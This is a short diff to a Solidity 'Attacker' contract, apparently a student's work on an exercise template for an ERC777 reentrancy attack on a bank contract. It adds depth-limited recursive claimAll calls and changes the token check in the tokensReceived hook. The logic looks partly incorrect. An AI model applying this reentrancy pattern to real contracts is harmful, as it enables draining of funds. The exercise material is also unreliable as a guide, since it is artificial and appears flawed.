@@ -39,9 +39,13 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO START ATTACK GOES HERE
 			bank.deposit{value: amt}(); //deposit the amt to start the attack
 			emit Deposit(amt);			
-			bank.claimAll();
-			bank.claimAll();
-
+			
+      if((depth < max_depth) & (balances[msg.sender] != 0)){
+        depth ++;
+        bank.claimAll();
+      }
+      emit Recurse(depth);
+    
 	}
 
 	/*
@@ -65,8 +69,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-		require(msg.sender == address(token), "Invalid token");
-
+	    require(msg.sender == address(bank.token()), "Invalid token");
 	}
 
 }
